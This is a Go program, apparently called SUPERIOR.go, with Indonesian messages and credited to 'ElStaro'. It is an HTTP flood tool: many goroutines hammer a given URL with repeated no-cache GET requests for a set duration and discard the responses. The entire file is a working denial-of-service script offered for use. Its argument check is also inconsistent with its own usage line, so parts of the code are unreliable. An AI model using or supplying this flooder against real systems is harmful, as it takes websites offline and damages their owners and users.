package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 6 {
		fmt.Println("Penggunaan: go run SUPERIOR.go <URL> <THREADS> <TIME> <UA.TXT>")
		return
	}

	url := os.Args[1]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Error: Jumlah thread tidak valid")
		return
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Error: Durasi tidak valid")
		return
	}
	uaFile := os.Args[4]
	ua, err := ioutil.ReadFile(uaFile)
	if err != nil {
		fmt.Println("Error: Tidak dapat membaca file UA")
		return
	}

	var wg sync.WaitGroup
	wg.Add(threads)

	startTime := time.Now()

	for i := 0; i < threads; i++ {
		go func() {
			defer wg.Done()

			client := &http.Client{
				Transport: &http.Transport{
					MaxIdleConnsPerHost: 1000,
					IdleConnTimeout:     30 * time.Second,
				},
			}
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				fmt.Println("Error: Tidak dapat membuat permintaan")
				return
			}
			req.Header.Set("User-Agent", strings.TrimSpace(string(ua)))
			req.Header.Set("Accept-Encoding", "gzip, deflate")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Pragma", "no-cache")
			req.Close = false

			for time.Since(startTime).Seconds() < float64(duration) {
				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error: Tidak dapat melakukan permintaan")
					return
				}
				// Mengabaikan respons
				resp.Body.Close()
			}
		}()
	}

	wg.Wait()
	fmt.Println("Selesai! Tools oleh ElStaro")
}